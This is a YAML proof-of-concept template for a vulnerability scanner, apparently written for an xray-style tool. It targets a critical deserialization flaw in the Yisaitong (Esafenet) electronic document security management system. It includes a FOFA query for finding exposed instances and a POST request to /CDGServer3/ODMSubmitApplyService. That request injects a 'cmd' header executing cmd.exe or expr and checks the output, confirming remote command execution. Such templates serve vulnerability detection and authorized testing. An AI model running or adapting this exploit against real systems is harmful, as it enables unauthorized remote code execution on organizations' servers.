id: poc-yaml-yisaitong-esafenet-oddmsubmitapplyservice-unserialize
info:
  name: 亿赛通电子文档安全管理系统 ODMSubmitApplyService 反序列化漏洞
  severity: critical
  tags:
  - 反序列化
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(111000,999000)
  t2: random_int(100,1000)
  t3: t1 - t2
  command: '"cmd.exe /c set /a "+ str(t1) +" - "+ str(t2)

    "expr "+ str(t1) + " - " + str(t2)

    '
firstRequest:
  method: GET
  path: /CDGServer3/ODMSubmitApplyService
  expression: 'status_code == 200

    '
requests:
- method: POST
  path: /CDGServer3/ODMSubmitApplyService?command=GETSYSTEMINFO
  headers:
    cmd: '{{.command}}'
  data: 
  expression: 'status_code == 200 &&

    body == t3

    '
transport: http
